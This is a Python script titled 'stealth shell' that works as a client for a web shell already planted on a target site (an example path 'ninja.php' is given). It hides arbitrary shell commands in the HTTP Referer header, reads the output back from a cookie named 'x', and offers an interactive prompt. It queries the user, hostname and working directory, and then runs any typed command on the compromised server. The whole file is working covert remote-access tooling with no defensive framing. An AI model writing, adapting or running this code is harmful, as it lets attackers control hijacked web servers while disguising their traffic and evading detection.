import requests
from urllib.parse import unquote
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(bcolors.FAIL + '''                                 
                    ,--,,-.----.    
  ,----..         ,--.'|\    /  \   
 /   /   \     ,--,  | :|   :    \  
|   :     : ,---.'|  : '|   |  .\ : 
.   |  ;. / |   | : _' |.   :  |: | 
.   ; /--`  :   : |.'  ||   |   \ : 
;   | ;  __ |   ' '  ; :|   : .   / 
|   : |.' .''   |  .'. |;   | |`-'  
.   | '_.' :|   | :  | '|   | ;     
'   ; : \  |'   : |  : ;:   ' |     
'   | '/  .'|   | '  ,/ :   : :     
|   :    /  ;   : ;--'  |   | :     
 \   \ .'   |   ,/      `---'.|     
  `---`     '---'         `---`     
  
  stealth shell 
''' + bcolors.ENDC)

def main():
    print("")
    getcwd()
    cmd = input(f"${bcolors.FAIL}${user}@${hostname}${bcolors.ENDC}:${bcolors.OKBLUE}${cwd}${bcolors.FAIL}$ ")
    if cmd == "su":
        print("")
        print(bcolors.FAIL + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
        main()
    elif cmd == "exit":
        exit(0)
    elif not cmd:
        main()
    else:
        try:
            r=session.get(target, headers={"Referer":cmd})
            print(unquote(r.cookies['x'].replace('+',' ')))
            main()
        except:
            print(' ')
            main()

def getsession():
    global session
    global r
    session = requests.Session()
    r = session.head(target, headers={"Referer": "id"})
    print("cookie: " + r.headers["Set-Cookie"])

def getuser():
    global user 
    global hostname
    k = session.head(target, headers={"Referer": "whoami;cat /proc/sys/kernel/hostname"})
    userhostname = unquote(k.cookies['x'].replace('+',' ')).split()
    user = userhostname[0]
    hostname = userhostname[1]

def getcwd():
    global d
    global cwd
    d = session.get(target, headers={"Referer":"pwd"})
    cwd = unquote(d.cookies['x'].replace('+',' ')).strip()

target = input("Target site (http://xxxxx.com/ninja.php) > ")
print('(type exit to exit)')
print('')
parsed_uri = urlparse(target)
domain = '{uri.netloc}'.format(uri=parsed_uri)



getsession()
getuser()
main()
